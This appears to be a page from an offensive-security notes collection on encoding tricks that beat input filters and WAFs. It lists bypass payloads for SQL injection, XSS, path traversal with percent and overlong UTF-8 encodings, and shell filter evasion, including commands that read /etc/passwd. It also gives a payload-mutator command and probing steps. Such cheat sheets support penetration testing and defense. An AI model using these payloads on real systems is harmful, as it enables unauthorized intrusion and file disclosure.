# Encoding and Filter Bypass

Encoding is not obfuscation for its own sake. It is a way to make two parsers disagree.
Use the matrix that matches the layer you are fighting.

---

## The matrix

| Layer | Encoding that beats it |
|---|---|
| Naive string replace | double encoding, case, comments |
| Regex with `\w` | unicode homoglyph, fullwidth |
| URL-decode-once | `%2527`, `%252e` |
| HTML-entity filter | numeric, hex entity, no-semicolon entity |
| JSON parser | `\u0027`, `\x27`, unicode escape |
| Path normalizer | overlong UTF-8, `..;/`, `%c0%af` |
| SQL keyword filter | comments, case, `CHAR()`, hex literal |
| Shell filter | `$IFS`, `${IFS}`, backticks, `\` escaping |
| XSS tag filter | alternate tags, event handlers, `javascript:` in `action` |
| Length limit | short forms, `eval(name)`, `onerror=alert(1)` |

---

## Generate the set

```bash
python3 07-tooling/python/payload_mutator.py -p "' OR 1=1--" --matrix url,double,case,ws,fullwidth
```

---

## Unicode and homoglyphs

```
'  →  U+2019 ’   U+02BC ʼ   U+FF07 ＇
<  →  U+FF1C ＜
/  →  U+FF0F ／
space → U+00A0, U+2000..U+200A, U+3000
```

Fullwidth digits and letters bypass `[a-z]`-style filters and are normalized by many
Unicode-aware parsers downstream.

---

## HTML entity contexts

```
&#x27;   &#39;   &apos;   &AMP;   &#0000039;
```

Use no-semicolon forms (`&#39`) where the parser is lenient and the filter requires `;`.

---

## JSON escapes

```
\u0027  \u003c  \u0022  \/  \b\f\n\r\t
```

A JSON body that is string-interpolated into SQL after `json.loads` will see the decoded
character. The WAF sees the escape.

---

## Shell

```
$IFS   ${IFS}   $'\x20'   {cat,/etc/passwd}   c\at   /bin/c?t
```

`$IFS` is the canonical space substitute. Brace expansion removes the space entirely.

---

## Path

```
..%2f  ..%252f  ..%c0%af  ..%e0%80%af  ....//  ..;/  ..%5c  .%2e/
```

Alternate separators (`%5c` backslash) matter on Windows/IIS and on any host that
normalizes both.

---

## The double-decode probe

Send `%2527`. If the app errors with a quote-related message, it decodes twice and the
whole matrix opens. If it errors with a `%` message, it decodes once and you need the
single-encoded form.

---

## Go deeper

1. Determine the decode count precisely: `%25`, `%2525`, `%252525`.
2. Test charset handling: send UTF-8 in a `charset=iso-8859-1` body.
3. Test normalization: `ﬁ` ligature, `Ⅳ` roman numeral, `①`.
4. Test truncation: does a 4096-byte value get cut at 255?
5. Test the same payload in a cookie — cookie parsers rarely share the query filter.

---

## Related

- `02-web/401-to-200.md`
- `11-regex/20-bypass.md`
- `00-core/impact-proof.md`
